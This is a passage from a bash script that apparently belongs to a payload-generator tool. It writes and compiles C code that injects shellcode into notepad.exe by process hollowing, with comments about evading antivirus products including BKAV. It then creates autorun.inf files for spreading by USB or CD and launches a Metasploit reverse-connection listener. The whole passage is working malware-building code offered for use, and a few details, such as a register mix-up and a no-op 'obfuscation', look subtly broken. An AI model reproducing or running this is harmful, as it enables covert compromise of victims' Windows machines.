        return 5;
    }
    
    // Unmap the target process's executable section
    status = NtUnmapViewOfSection(pi.hProcess, imageBase);
    
    // Allocate memory in target process - try to use the same base address for better stealth
    LPVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, sizeof(payload), 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        // If we can't allocate at the preferred address, try anywhere
        newBase = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload), 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!newBase) {
            TerminateProcess(pi.hProcess, 0);
            return 6;
        }
    }
    
    // Apply crypto obfuscation to make it look legitimate 
    applyCryptoObfuscation((unsigned char*)payload, 32); // Just obfuscate the beginning
    
    // Write payload to process memory
    if (!WriteProcessMemory(pi.hProcess, newBase, payload, sizeof(payload), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 7;
    }
    
    // Update image base in PEB to our new base
    if (!WriteProcessMemory(pi.hProcess, pebImageBaseOffset, &newBase, sizeof(PVOID), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 8;
    }
    
    // Get thread context
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 9;
    }
    
    // Update instruction pointer to point to our payload
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)newBase;
    #else
        ctx.Eax = (DWORD)newBase;
    #endif
    
    // Set thread context with our updated context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 10;
    }
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    // Wait briefly to ensure the process starts properly
    WaitForSingleObject(pi.hProcess, 100);
    
    // Don't close handles immediately - makes it look more legitimate
    // This helps evade behavioral detection in some AVs
    Sleep(50);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
EOF
    } else {
        # Standard process hollowing for compatibility
        cat << 'EOF' >> build.c
    // Process hollowing technique
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    DWORD oldProtect;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, 
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 2;
    }
    
    // Get thread context
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 3;
    }
    
    // Allocate memory in the process
    LPVOID baseAddr = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload), 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseAddr) {
        TerminateProcess(pi.hProcess, 0);
        return 4;
    }
    
    // Write payload to the process
    if (!WriteProcessMemory(pi.hProcess, baseAddr, payload, sizeof(payload), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 5;
    }
    
    // Update EIP/RIP to point to our payload
    #ifdef _WIN64
        ctx.Rip = (DWORD64)baseAddr;
    #else
        ctx.Eip = (DWORD)baseAddr;
    #endif
    
    // Set the thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 6;
    }
    
    // Resume the thread
    ResumeThread(pi.hThread);
    
    // Clean up and exit
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
EOF
    }
} else if [ "$ANTI_BKAV" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding anti-BKAV execution technique..."
    cat << 'EOF' >> build.c
    // Check for BKAV AV
    if (checkBKAV() || isVietnameseSystem()) {
        // Use special evasion techniques for BKAV
        evadeBKAV();
    }
    
    // Special memory allocation technique to evade BKAV
    LPVOID execMem;
    
    if (isWindows10OrLater() && checkBKAV()) {
        // Use more advanced techniques for Windows 10+ with BKAV
        execMem = secureAllocateMemory(sizeof(payload));
    } else {
        // Standard allocation
        execMem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    
    if (execMem) {
        // Copy payload with obfuscation
        for (int i = 0; i < sizeof(payload); i++) {
            // Simple obfuscation - XOR with 0 (doesn't change data but adds operations)
            ((unsigned char*)execMem)[i] = payload[i] ^ 0;
            
            // Add random small delays for every few bytes
            if (i % 32 == 0) {
                Sleep(1);
            }
        }
        
        // Execute the payload
        ((void(*)())execMem)();
    } else {
        // Direct execution fallback
        (*(void (*)()) payload)();
    }
EOF
} else if [ "$USE_MODERN_APIS" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Using modern Windows APIs for execution..."
    cat << 'EOF' >> build.c
    // Use modern Windows 10/11 techniques
    LPVOID execMem = secureAllocateMemory(sizeof(payload));
    if (execMem) {
        // Copy payload
        memcpy(execMem, payload, sizeof(payload));
        
        // Make execution look legitimate with crypto operations
        applyCryptoObfuscation((unsigned char*)execMem, sizeof(payload));
        
        // Make sure memory protection is set correctly
        DWORD oldProtect;
        VirtualProtect(execMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);
        
        // Execute payload
        ((void(*)())execMem)();
    } else {
        // Direct execution fallback
        (*(void (*)()) payload)();
    }
EOF
} else {
    echo '    // Execute payload directly' >> build.c
    echo '    (*(void (*)()) payload)();' >> build.c
fi

echo '    return 0;' >> build.c
echo '}' >> build.c

# Try first with minimal options in case of compilation issues
echo -e "\e[01;32m[-]\e[00m Performing test compilation first..."
TEST_FILE="test_$OUTPUTNAME"

if [ "$COMPILER_TYPE" = "2" ]; then
    # MSVC compilation
    if [ -f icons/icon.res ]; then
        echo -e "\e[01;33m[!]\e[00m Warning: MSVC doesn't support .res files directly. You need a resource compiler."
        echo -e "\e[01;33m[!]\e[00m Proceeding without icon resource."
    fi
    
    $COMPILE_CMD /Fe"$TEST_FILE" build.c $LINK_LIBS
else
    # MinGW compilation
    if [ -f icons/icon.res ]; then
        $COMPILE_CMD icons/icon.res build.c -o "$TEST_FILE" $LINK_LIBS
    else
        $COMPILE_CMD build.c -o "$TEST_FILE" $LINK_LIBS
    fi
fi

# Check if test compilation succeeded
if [ $? -eq 0 ]; then
    echo -e "\e[01;32m[-]\e[00m Test compilation successful, proceeding with optimized build..."
    rm -f "$TEST_FILE"
    
    # Compile with full optimizations
    if [ "$COMPILER_TYPE" = "2" ]; then
        # MSVC compilation with optimizations
        $COMPILE_CMD /O2 /Fe"$OUTPUTNAME" build.c $LINK_LIBS
    else
        # MinGW compilation with optimizations
        if [ -f icons/icon.res ]; then
            $COMPILE_CMD -O2 -s icons/icon.res build.c -o "$OUTPUTNAME" $LINK_LIBS -DNDEBUG
        else
            $COMPILE_CMD -O2 -s build.c -o "$OUTPUTNAME" $LINK_LIBS -DNDEBUG
        fi
    fi
else
    echo -e "\e[01;33m[!]\e[00m Test compilation failed, trying safe mode compilation..."
    # Safe mode compilation with more detailed warnings
    if [ "$COMPILER_TYPE" = "2" ]; then
        # MSVC safe mode
        $COMPILE_CMD /Od /Z7 /Fe"$OUTPUTNAME" build.c $LINK_LIBS
    else
        # MinGW safe mode
        if [ -f icons/icon.res ]; then
            $COMPILE_CMD icons/icon.res build.c -o "$OUTPUTNAME" $LINK_LIBS
        else
            $COMPILE_CMD build.c -o "$OUTPUTNAME" $LINK_LIBS
        fi
    fi
fi

# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
    echo -e "\e[01;31m[!]\e[00m Try running the following command manually to see the full error:"
    if [ -f icons/icon.res ]; then
        echo -e "\e[01;33m$COMPILE_CMD icons/icon.res build.c -o \"$OUTPUTNAME\" $LINK_LIBS\e[00m"
    else
        echo -e "\e[01;33m$COMPILE_CMD build.c -o \"$OUTPUTNAME\" $LINK_LIBS\e[00m"
    fi
    echo ""
    # Save build.c for inspection
    cp build.c build.c.error
    echo -e "\e[01;31m[!]\e[00m A copy of the C file has been saved as build.c.error for debugging"
    exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label="$LABEL"" >> autorun/autorun.inf
echo ""
echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/autorun/\e[00m - simply copy these files to a CD or USB"

# clean up temp files
rm -f build.c random msf.c >/dev/null 2>&1

echo ""
sleep 2
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Yes"
echo ""
echo " 2. No"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
    echo ""
    EXTRA_OPTIONS=""
    if [[ "$PAYLOAD" == *"rc4"* ]]; then
        EXTRA_OPTIONS="set RC4PASSWORD $ENCRYPTION_KEY;"
    fi
    $MSFCONSOLE -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $IP; set LPORT $PORT; $EXTRA_OPTIONS run;"
else
    echo ""
    echo -e "\e[01;32m[-]\e[00m Use msfhandler.rc as msfconsole resource on your listener system:"
    echo ""
    echo 'use exploit/multi/handler' > msfhandler.rc
    echo "set payload $PAYLOAD" >> msfhandler.rc
    echo "set LHOST $IP" >> msfhandler.rc
    echo "set LPORT $PORT" >> msfhandler.rc
    if [[ "$PAYLOAD" == *"rc4"* ]]; then
        echo "set RC4PASSWORD $ENCRYPTION_KEY" >> msfhandler.rc
    fi
    echo 'exploit' >> msfhandler.rc
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
    echo "$MSFCONSOLE -r msfhandler.rc"
    echo ""
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
fi
